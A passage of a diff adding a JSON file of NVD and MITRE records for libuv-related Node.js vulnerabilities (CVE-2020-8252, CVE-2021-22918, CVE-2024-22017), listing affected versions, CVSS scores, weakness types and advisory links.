+                    "criteria": "cpe:2.3:a:nodejs:node.js:*:*:*:*:lts:*:*:*",
+                    "versionStartIncluding": "12.0.0",
+                    "versionEndExcluding": "12.18.4",
+                    "matchCriteriaId": "3CB8E8E0-24CC-417B-96D7-AF53B2296661"
+                  },
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:nodejs:node.js:*:*:*:*:-:*:*:*",
+                    "versionStartIncluding": "14.0.0",
+                    "versionEndExcluding": "14.9.0",
+                    "matchCriteriaId": "F0300B3A-89AE-40AF-BDAF-EB3F5DA6A66E"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:o:opensuse:leap:15.2:*:*:*:*:*:*:*",
+                    "matchCriteriaId": "B009C22E-30A4-4288-BCF6-C3E81DEAF45A"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:o:fedoraproject:fedora:33:*:*:*:*:*:*:*",
+                    "matchCriteriaId": "E460AA51-FCDA-46B9-AE97-E6676AA5E194"
+                  }
+                ]
+              }
+            ]
+          }
+        ],
+        "references": [
+          {
+            "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00011.html",
+            "source": "support@hackerone.com",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00023.html",
+            "source": "support@hackerone.com",
+            "tags": [
+              "Mailing List",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://hackerone.com/reports/965914",
+            "source": "support@hackerone.com",
+            "tags": [
+              "Permissions Required",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/",
+            "source": "support@hackerone.com"
+          },
+          {
+            "url": "https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/",
+            "source": "support@hackerone.com",
+            "tags": [
+              "Vendor Advisory"
+            ]
+          },
+          {
+            "url": "https://security.gentoo.org/glsa/202009-15",
+            "source": "support@hackerone.com",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://security.netapp.com/advisory/ntap-20201009-0004/",
+            "source": "support@hackerone.com",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://usn.ubuntu.com/4548-1/",
+            "source": "support@hackerone.com",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00011.html",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00023.html",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Mailing List",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://hackerone.com/reports/965914",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Permissions Required",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          },
+          {
+            "url": "https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Vendor Advisory"
+            ]
+          },
+          {
+            "url": "https://security.gentoo.org/glsa/202009-15",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://security.netapp.com/advisory/ntap-20201009-0004/",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://usn.ubuntu.com/4548-1/",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          }
+        ]
+      },
+      "mitre": {
+        "containers": {
+          "cna": {
+            "affected": [
+              {
+                "product": "Node",
+                "vendor": "NodeJS",
+                "defaultStatus": "unaffected",
+                "versions": [
+                  {
+                    "versionType": "semver",
+                    "version": "4.0",
+                    "status": "affected",
+                    "lessThan": "4.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "5.0",
+                    "status": "affected",
+                    "lessThan": "5.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "6.0",
+                    "status": "affected",
+                    "lessThan": "6.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "7.0",
+                    "status": "affected",
+                    "lessThan": "7.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "8.0",
+                    "status": "affected",
+                    "lessThan": "8.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "9.0",
+                    "status": "affected",
+                    "lessThan": "9.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "10.0",
+                    "status": "affected",
+                    "lessThan": "10.22.1"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "11.0",
+                    "status": "affected",
+                    "lessThan": "11.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "12.0",
+                    "status": "affected",
+                    "lessThan": "12.18.4"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "13.0",
+                    "status": "affected",
+                    "lessThan": "13.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "14.0",
+                    "status": "affected",
+                    "lessThan": "14.9.0"
+                  }
+                ]
+              }
+            ],
+            "descriptions": [
+              {
+                "lang": "en",
+                "value": "The implementation of realpath in libuv < 10.22.1, < 12.18.4, and < 14.9.0 used within Node.js incorrectly determined the buffer size which can result in a buffer overflow if the resolved path is longer than 256 bytes."
+              }
+            ],
+            "problemTypes": [
+              {
+                "descriptions": [
+                  {
+                    "cweId": "CWE-120",
+                    "description": "Classic Buffer Overflow (CWE-120)",
+                    "lang": "en",
+                    "type": "CWE"
+                  }
+                ]
+              }
+            ],
+            "providerMetadata": {
+              "orgId": "36234546-b8fa-4601-9d6f-f4e334aa8ea1",
+              "shortName": "hackerone",
+              "dateUpdated": "2025-04-30T22:24:26.861Z"
+            },
+            "references": [
+              {
+                "tags": [
+                  "x_refsource_MISC"
+                ],
+                "url": "https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/"
+              },
+              {
+                "tags": [
+                  "x_refsource_MISC"
+                ],
+                "url": "https://hackerone.com/reports/965914"
+              },
+              {
+                "name": "GLSA-202009-15",
+                "tags": [
+                  "vendor-advisory",
+                  "x_refsource_GENTOO"
+                ],
+                "url": "https://security.gentoo.org/glsa/202009-15"
+              },
+              {
+                "name": "USN-4548-1",
+                "tags": [
+                  "vendor-advisory",
+                  "x_refsource_UBUNTU"
+                ],
+                "url": "https://usn.ubuntu.com/4548-1/"
+              },
+              {
+                "name": "openSUSE-SU-2020:1616",
+                "tags": [
+                  "vendor-advisory",
+                  "x_refsource_SUSE"
+                ],
+                "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00011.html"
+              },
+              {
+                "tags": [
+                  "x_refsource_CONFIRM"
+                ],
+                "url": "https://security.netapp.com/advisory/ntap-20201009-0004/"
+              },
+              {
+                "name": "openSUSE-SU-2020:1660",
+                "tags": [
+                  "vendor-advisory",
+                  "x_refsource_SUSE"
+                ],
+                "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00023.html"
+              },
+              {
+                "name": "FEDORA-2020-43d5a372fc",
+                "tags": [
+                  "vendor-advisory",
+                  "x_refsource_FEDORA"
+                ],
+                "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/"
+              }
+            ],
+            "x_legacyV4Record": {
+              "CVE_data_meta": {
+                "ASSIGNER": "support@hackerone.com",
+                "ID": "CVE-2020-8252",
+                "STATE": "PUBLIC"
+              },
+              "affects": {
+                "vendor": {
+                  "vendor_data": [
+                    {
+                      "product": {
+                        "product_data": [
+                          {
+                            "product_name": "https://github.com/nodejs/node",
+                            "version": {
+                              "version_data": [
+                                {
+                                  "version_value": "Fixed in 10.22.1, 12.18.4, 14.9.0"
+                                }
+                              ]
+                            }
+                          }
+                        ]
+                      },
+                      "vendor_name": "n/a"
+                    }
+                  ]
+                }
+              },
+              "data_format": "MITRE",
+              "data_type": "CVE",
+              "data_version": "4.0",
+              "description": {
+                "description_data": [
+                  {
+                    "lang": "eng",
+                    "value": "The implementation of realpath in libuv < 10.22.1, < 12.18.4, and < 14.9.0 used within Node.js incorrectly determined the buffer size which can result in a buffer overflow if the resolved path is longer than 256 bytes."
+                  }
+                ]
+              },
+              "problemtype": {
+                "problemtype_data": [
+                  {
+                    "description": [
+                      {
+                        "lang": "eng",
+                        "value": "Classic Buffer Overflow (CWE-120)"
+                      }
+                    ]
+                  }
+                ]
+              },
+              "references": {
+                "reference_data": [
+                  {
+                    "name": "https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/",
+                    "refsource": "MISC",
+                    "url": "https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/"
+                  },
+                  {
+                    "name": "https://hackerone.com/reports/965914",
+                    "refsource": "MISC",
+                    "url": "https://hackerone.com/reports/965914"
+                  },
+                  {
+                    "name": "GLSA-202009-15",
+                    "refsource": "GENTOO",
+                    "url": "https://security.gentoo.org/glsa/202009-15"
+                  },
+                  {
+                    "name": "USN-4548-1",
+                    "refsource": "UBUNTU",
+                    "url": "https://usn.ubuntu.com/4548-1/"
+                  },
+                  {
+                    "name": "openSUSE-SU-2020:1616",
+                    "refsource": "SUSE",
+                    "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00011.html"
+                  },
+                  {
+                    "name": "https://security.netapp.com/advisory/ntap-20201009-0004/",
+                    "refsource": "CONFIRM",
+                    "url": "https://security.netapp.com/advisory/ntap-20201009-0004/"
+                  },
+                  {
+                    "name": "openSUSE-SU-2020:1660",
+                    "refsource": "SUSE",
+                    "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00023.html"
+                  },
+                  {
+                    "name": "FEDORA-2020-43d5a372fc",
+                    "refsource": "FEDORA",
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/"
+                  }
+                ]
+              }
+            }
+          },
+          "adp": [
+            {
+              "providerMetadata": {
+                "orgId": "af854a3a-2127-422b-91ae-364da2661108",
+                "shortName": "CVE",
+                "dateUpdated": "2024-08-04T09:56:28.202Z"
+              },
+              "title": "CVE Program Container",
+              "references": [
+                {
+                  "tags": [
+                    "x_refsource_MISC",
+                    "x_transferred"
+                  ],
+                  "url": "https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/"
+                },
+                {
+                  "tags": [
+                    "x_refsource_MISC",
+                    "x_transferred"
+                  ],
+                  "url": "https://hackerone.com/reports/965914"
+                },
+                {
+                  "name": "GLSA-202009-15",
+                  "tags": [
+                    "vendor-advisory",
+                    "x_refsource_GENTOO",
+                    "x_transferred"
+                  ],
+                  "url": "https://security.gentoo.org/glsa/202009-15"
+                },
+                {
+                  "name": "USN-4548-1",
+                  "tags": [
+                    "vendor-advisory",
+                    "x_refsource_UBUNTU",
+                    "x_transferred"
+                  ],
+                  "url": "https://usn.ubuntu.com/4548-1/"
+                },
+                {
+                  "name": "openSUSE-SU-2020:1616",
+                  "tags": [
+                    "vendor-advisory",
+                    "x_refsource_SUSE",
+                    "x_transferred"
+                  ],
+                  "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00011.html"
+                },
+                {
+                  "tags": [
+                    "x_refsource_CONFIRM",
+                    "x_transferred"
+                  ],
+                  "url": "https://security.netapp.com/advisory/ntap-20201009-0004/"
+                },
+                {
+                  "name": "openSUSE-SU-2020:1660",
+                  "tags": [
+                    "vendor-advisory",
+                    "x_refsource_SUSE",
+                    "x_transferred"
+                  ],
+                  "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00023.html"
+                },
+                {
+                  "name": "FEDORA-2020-43d5a372fc",
+                  "tags": [
+                    "vendor-advisory",
+                    "x_refsource_FEDORA",
+                    "x_transferred"
+                  ],
+                  "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/"
+                }
+              ]
+            }
+          ]
+        },
+        "cveMetadata": {
+          "assignerOrgId": "36234546-b8fa-4601-9d6f-f4e334aa8ea1",
+          "assignerShortName": "hackerone",
+          "cveId": "CVE-2020-8252",
+          "datePublished": "2020-09-18T20:11:51.000Z",
+          "dateReserved": "2020-01-28T00:00:00.000Z",
+          "dateUpdated": "2025-04-30T22:24:26.861Z",
+          "state": "PUBLISHED"
+        },
+        "dataType": "CVE_RECORD",
+        "dataVersion": "5.1"
+      },
+      "github_repository_security_advisory": null
+    },
+    {
+      "cve_id": "CVE-2021-22918",
+      "scope": "libuv_root_cause_in_nodejs",
+      "inclusion_rationale": "Published against Node.js releases, but the vulnerable functions named in NVD/MITRE are libuv code paths (uv__idna_toascii via uv_getaddrinfo); Debian also patched libuv for this CVE.",
+      "local_repo_evidence": [
+        {
+          "path": "original/debian/changelog",
+          "line": 114,
+          "text": "  * add patch for CVE-2021-22918 (Closes: #990561)"
+        }
+      ],
+      "nvd": {
+        "id": "CVE-2021-22918",
+        "sourceIdentifier": "support@hackerone.com",
+        "published": "2021-07-12T11:15:07.937",
+        "lastModified": "2024-11-21T05:50:54.763",
+        "vulnStatus": "Modified",
+        "cveTags": [],
+        "descriptions": [
+          {
+            "lang": "en",
+            "value": "Node.js before 16.4.1, 14.17.2, 12.22.2 is vulnerable to an out-of-bounds read when uv__idna_toascii() is used to convert strings to ASCII. The pointer p is read and increased without checking whether it is beyond pe, with the latter holding a pointer to the end of the buffer. This can lead to information disclosures or crashes. This function can be triggered via uv_getaddrinfo()."
+          },
+          {
+            "lang": "es",
+            "value": "Node.js versiones anteriores a 16.4.1, 14.17.2, 12.22.2, es vulnerable a una lectura fuera de límites cuando la función  uv__idna_toascii() es usada para convertir cadenas a ASCII. El puntero p es leído e incrementado sin comprobar si está más allá de pe, siendo este último un puntero al final del buffer. Esto puede conllevar a una revelación de información o el bloqueo de la misma. Esta función puede ser desencadenada por medio de la función uv_getaddrinfo()"
+          }
+        ],
+        "metrics": {
+          "cvssMetricV31": [
+            {
+              "source": "nvd@nist.gov",
+              "type": "Primary",
+              "cvssData": {
+                "version": "3.1",
+                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                "baseScore": 5.3,
+                "baseSeverity": "MEDIUM",
+                "attackVector": "NETWORK",
+                "attackComplexity": "LOW",
+                "privilegesRequired": "NONE",
+                "userInteraction": "NONE",
+                "scope": "UNCHANGED",
+                "confidentialityImpact": "LOW",
+                "integrityImpact": "NONE",
+                "availabilityImpact": "NONE"
+              },
+              "exploitabilityScore": 3.9,
+              "impactScore": 1.4
+            }
+          ],
+          "cvssMetricV2": [
+            {
+              "source": "nvd@nist.gov",
+              "type": "Primary",
+              "cvssData": {
+                "version": "2.0",
+                "vectorString": "AV:N/AC:L/Au:N/C:P/I:N/A:N",
+                "baseScore": 5.0,
+                "accessVector": "NETWORK",
+                "accessComplexity": "LOW",
+                "authentication": "NONE",
+                "confidentialityImpact": "PARTIAL",
+                "integrityImpact": "NONE",
+                "availabilityImpact": "NONE"
+              },
+              "baseSeverity": "MEDIUM",
+              "exploitabilityScore": 10.0,
+              "impactScore": 2.9,
+              "acInsufInfo": false,
+              "obtainAllPrivilege": false,
+              "obtainUserPrivilege": false,
+              "obtainOtherPrivilege": false,
+              "userInteractionRequired": false
+            }
+          ]
+        },
+        "weaknesses": [
+          {
+            "source": "support@hackerone.com",
+            "type": "Secondary",
+            "description": [
+              {
+                "lang": "en",
+                "value": "CWE-125"
+              }
+            ]
+          },
+          {
+            "source": "nvd@nist.gov",
+            "type": "Primary",
+            "description": [
+              {
+                "lang": "en",
+                "value": "CWE-125"
+              }
+            ]
+          }
+        ],
+        "configurations": [
+          {
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:nodejs:node.js:*:*:*:*:-:*:*:*",
+                    "versionStartIncluding": "12.0.0",
+                    "versionEndExcluding": "12.22.2",
+                    "matchCriteriaId": "21182B8A-26B0-4B41-936B-0FE9BE2A9106"
+                  },
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:nodejs:node.js:*:*:*:*:-:*:*:*",
+                    "versionStartIncluding": "14.0.0",
+                    "versionEndExcluding": "14.17.2",
+                    "matchCriteriaId": "1F098EFB-E24C-4277-B868-19FF6195E19D"
+                  },
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:nodejs:node.js:*:*:*:*:-:*:*:*",
+                    "versionStartIncluding": "16.0.0",
+                    "versionEndExcluding": "16.4.1",
+                    "matchCriteriaId": "99CD41F3-115F-459D-A935-F55784CB5989"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:siemens:sinec_infrastructure_network_services:*:*:*:*:*:*:*:*",
+                    "versionEndExcluding": "1.0.1.1",
+                    "matchCriteriaId": "B0F46497-4AB0-49A7-9453-CC26837BF253"
+                  }
+                ]
+              }
+            ]
+          }
+        ],
+        "references": [
+          {
+            "url": "https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf",
+            "source": "support@hackerone.com",
+            "tags": [
+              "Patch",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://hackerone.com/reports/1209681",
+            "source": "support@hackerone.com",
+            "tags": [
+              "Exploit",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://nodejs.org/en/blog/vulnerability/july-2021-security-releases/",
+            "source": "support@hackerone.com",
+            "tags": [
+              "Patch",
+              "Vendor Advisory"
+            ]
+          },
+          {
+            "url": "https://security.gentoo.org/glsa/202401-23",
+            "source": "support@hackerone.com"
+          },
+          {
+            "url": "https://security.netapp.com/advisory/ntap-20210805-0003/",
+            "source": "support@hackerone.com",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Patch",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://hackerone.com/reports/1209681",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Exploit",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://nodejs.org/en/blog/vulnerability/july-2021-security-releases/",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Patch",
+              "Vendor Advisory"
+            ]
+          },
+          {
+            "url": "https://security.gentoo.org/glsa/202401-23",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          },
+          {
+            "url": "https://security.netapp.com/advisory/ntap-20210805-0003/",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          }
+        ]
+      },
+      "mitre": {
+        "dataType": "CVE_RECORD",
+        "dataVersion": "5.1",
+        "cveMetadata": {
+          "state": "PUBLISHED",
+          "cveId": "CVE-2021-22918",
+          "assignerOrgId": "36234546-b8fa-4601-9d6f-f4e334aa8ea1",
+          "assignerShortName": "hackerone",
+          "dateUpdated": "2025-04-30T22:24:33.832Z",
+          "dateReserved": "2021-01-06T00:00:00.000Z",
+          "datePublished": "2021-07-12T00:00:00.000Z"
+        },
+        "containers": {
+          "cna": {
+            "providerMetadata": {
+              "orgId": "36234546-b8fa-4601-9d6f-f4e334aa8ea1",
+              "shortName": "hackerone",
+              "dateUpdated": "2025-04-30T22:24:33.832Z"
+            },
+            "descriptions": [
+              {
+                "lang": "en",
+                "value": "Node.js before 16.4.1, 14.17.2, 12.22.2 is vulnerable to an out-of-bounds read when uv__idna_toascii() is used to convert strings to ASCII. The pointer p is read and increased without checking whether it is beyond pe, with the latter holding a pointer to the end of the buffer. This can lead to information disclosures or crashes. This function can be triggered via uv_getaddrinfo()."
+              }
+            ],
+            "affected": [
+              {
+                "product": "Node",
+                "vendor": "NodeJS",
+                "defaultStatus": "unaffected",
+                "versions": [
+                  {
+                    "versionType": "semver",
+                    "version": "4.0",
+                    "status": "affected",
+                    "lessThan": "4.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "5.0",
+                    "status": "affected",
+                    "lessThan": "5.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "6.0",
+                    "status": "affected",
+                    "lessThan": "6.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "7.0",
+                    "status": "affected",
+                    "lessThan": "7.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "8.0",
+                    "status": "affected",
+                    "lessThan": "8.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "9.0",
+                    "status": "affected",
+                    "lessThan": "9.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "10.0",
+                    "status": "affected",
+                    "lessThan": "10.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "11.0",
+                    "status": "affected",
+                    "lessThan": "11.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "12.0",
+                    "status": "affected",
+                    "lessThan": "12.22.2"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "13.0",
+                    "status": "affected",
+                    "lessThan": "13.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "14.0",
+                    "status": "affected",
+                    "lessThan": "14.17.2"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "15.0",
+                    "status": "affected",
+                    "lessThan": "15.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "16.0",
+                    "status": "affected",
+                    "lessThan": "16.4.1"
+                  }
+                ]
+              }
+            ],
+            "references": [
+              {
+                "url": "https://hackerone.com/reports/1209681"
+              },
+              {
+                "url": "https://nodejs.org/en/blog/vulnerability/july-2021-security-releases/"
+              },
+              {
+                "url": "https://security.netapp.com/advisory/ntap-20210805-0003/"
+              },
+              {
+                "url": "https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf"
+              },
+              {
+                "name": "GLSA-202401-23",
+                "tags": [
+                  "vendor-advisory"
+                ],
+                "url": "https://security.gentoo.org/glsa/202401-23"
+              }
+            ],
+            "problemTypes": [
+              {
+                "descriptions": [
+                  {
+                    "type": "CWE",
+                    "lang": "en",
+                    "description": "Out-of-bounds Read (CWE-125)",
+                    "cweId": "CWE-125"
+                  }
+                ]
+              }
+            ]
+          },
+          "adp": [
+            {
+              "providerMetadata": {
+                "orgId": "af854a3a-2127-422b-91ae-364da2661108",
+                "shortName": "CVE",
+                "dateUpdated": "2024-08-03T18:58:25.665Z"
+              },
+              "title": "CVE Program Container",
+              "references": [
+                {
+                  "url": "https://hackerone.com/reports/1209681",
+                  "tags": [
+                    "x_transferred"
+                  ]
+                },
+                {
+                  "url": "https://nodejs.org/en/blog/vulnerability/july-2021-security-releases/",
+                  "tags": [
+                    "x_transferred"
+                  ]
+                },
+                {
+                  "url": "https://security.netapp.com/advisory/ntap-20210805-0003/",
+                  "tags": [
+                    "x_transferred"
+                  ]
+                },
+                {
+                  "url": "https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf",
+                  "tags": [
+                    "x_transferred"
+                  ]
+                },
+                {
+                  "name": "GLSA-202401-23",
+                  "tags": [
+                    "vendor-advisory",
+                    "x_transferred"
+                  ],
+                  "url": "https://security.gentoo.org/glsa/202401-23"
+                }
+              ]
+            }
+          ]
+        }
+      },
+      "github_repository_security_advisory": null
+    },
+    {
+      "cve_id": "CVE-2024-22017",
+      "scope": "libuv_root_cause_in_nodejs",
+      "inclusion_rationale": "Published against Node.js releases, but MITRE describes libuv internal io_uring behavior as the source of the privilege-dropping flaw.",
+      "local_repo_evidence": [],
+      "nvd": {
+        "id": "CVE-2024-22017",
+        "sourceIdentifier": "support@hackerone.com",
+        "published": "2024-03-19T05:15:10.073",
+        "lastModified": "2024-11-21T08:55:24.130",
+        "vulnStatus": "Awaiting Analysis",
+        "cveTags": [],
+        "descriptions": [
+          {
+            "lang": "en",
+            "value": "setuid() does not affect libuv's internal io_uring operations if initialized before the call to setuid().\nThis allows the process to perform privileged operations despite presumably having dropped such privileges through a call to setuid().\nThis vulnerability affects all users using version greater or equal than Node.js 18.18.0, Node.js 20.4.0 and Node.js 21."
+          },
+          {
+            "lang": "es",
+            "value": "setuid() no afecta las operaciones io_uring internas de libuv si se inicializa antes de la llamada a setuid(). Esto permite que el proceso realice operaciones privilegiadas a pesar de haber perdido dichos privilegios mediante una llamada a setuid(). Esta vulnerabilidad afecta a todos los usuarios que utilizan una versión mayor o igual a Node.js 18.18.0, Node.js 20.4.0 y Node.js 21."
+          }
+        ],
+        "metrics": {
+          "cvssMetricV30": [
+            {
+              "source": "support@hackerone.com",
+              "type": "Secondary",
+              "cvssData": {
+                "version": "3.0",
+                "vectorString": "CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:C/C:L/I:H/A:L",
+                "baseScore": 7.3,
+                "baseSeverity": "HIGH",
+                "attackVector": "LOCAL",
+                "attackComplexity": "LOW",
+                "privilegesRequired": "HIGH",
+                "userInteraction": "NONE",
+                "scope": "CHANGED",
+                "confidentialityImpact": "LOW",
+                "integrityImpact": "HIGH",
+                "availabilityImpact": "LOW"
+              },
+              "exploitabilityScore": 1.5,
+              "impactScore": 5.3
+            }
+          ]
+        },
+        "weaknesses": [
+          {
+            "source": "134c704f-9b21-4f2e-91b3-4a467353bcc0",
+            "type": "Secondary",
+            "description": [
+              {
+                "lang": "en",
+                "value": "CWE-250"
+              }
+            ]
+          }
+        ],
+        "references": [
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2024/03/11/1",
+            "source": "support@hackerone.com"
+          },
+          {
+            "url": "https://hackerone.com/reports/2170226",
+            "source": "support@hackerone.com"
+          },
+          {
+            "url": "https://security.netapp.com/advisory/ntap-20240517-0007/",
+            "source": "support@hackerone.com"
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2024/03/11/1",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          },
+          {
+            "url": "https://hackerone.com/reports/2170226",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          },
+          {
+            "url": "https://security.netapp.com/advisory/ntap-20240517-0007/",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          }
+        ]
+      },
+      "mitre": {
+        "dataType": "CVE_RECORD",
+        "cveMetadata": {
+          "cveId": "CVE-2024-22017",
+          "assignerOrgId": "36234546-b8fa-4601-9d6f-f4e334aa8ea1",
+          "state": "PUBLISHED",
+          "assignerShortName": "hackerone",
+          "dateReserved": "2024-01-04T01:04:06.573Z",
+          "datePublished": "2024-03-19T04:32:34.137Z",
+          "dateUpdated": "2025-04-30T22:25:14.211Z"
+        },
+        "containers": {
+          "cna": {
+            "descriptions": [
+              {
+                "lang": "en",
+                "value": "setuid() does not affect libuv's internal io_uring operations if initialized before the call to setuid().\nThis allows the process to perform privileged operations despite presumably having dropped such privileges through a call to setuid().\nThis vulnerability affects all users using version greater or equal than Node.js 18.18.0, Node.js 20.4.0 and Node.js 21."
+              }
+            ],
+            "affected": [
+              {
+                "product": "Node",
+                "vendor": "NodeJS",
+                "defaultStatus": "unaffected",
+                "versions": [
+                  {
+                    "versionType": "semver",
+                    "version": "4.0",
+                    "status": "affected",
+                    "lessThan": "4.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "5.0",
+                    "status": "affected",
+                    "lessThan": "5.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "6.0",
+                    "status": "affected",
+                    "lessThan": "6.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "7.0",
+                    "status": "affected",
+                    "lessThan": "7.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "8.0",
+                    "status": "affected",
+                    "lessThan": "8.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "9.0",
+                    "status": "affected",
+                    "lessThan": "9.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "10.0",
+                    "status": "affected",
+                    "lessThan": "10.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "11.0",
+                    "status": "affected",
+                    "lessThan": "11.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "12.0",
+                    "status": "affected",
+                    "lessThan": "12.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "13.0",
+                    "status": "affected",
+                    "lessThan": "13.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "14.0",
+                    "status": "affected",
+                    "lessThan": "14.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "15.0",
+                    "status": "affected",
+                    "lessThan": "15.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "16.0",
+                    "status": "affected",
+                    "lessThan": "16.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "17.0",
+                    "status": "affected",
